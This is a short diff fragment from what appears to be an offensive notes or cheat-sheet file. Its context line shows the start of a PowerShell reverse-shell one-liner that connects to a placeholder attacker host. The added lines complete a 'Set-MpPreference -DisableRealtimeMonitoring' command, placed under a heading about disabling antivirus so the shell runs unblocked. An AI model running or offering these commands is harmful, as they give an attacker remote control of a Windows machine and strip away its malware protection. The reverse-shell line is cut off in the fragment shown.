@@ -17,5 +17,7 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<ATTACKER
 
 ### Disabling AV on Powershell so command will execute without blocking
 ```powershell
-Set-Mp
+Set-MpPreference -DisableRealtimeMonitoring $true
 ```
+
+
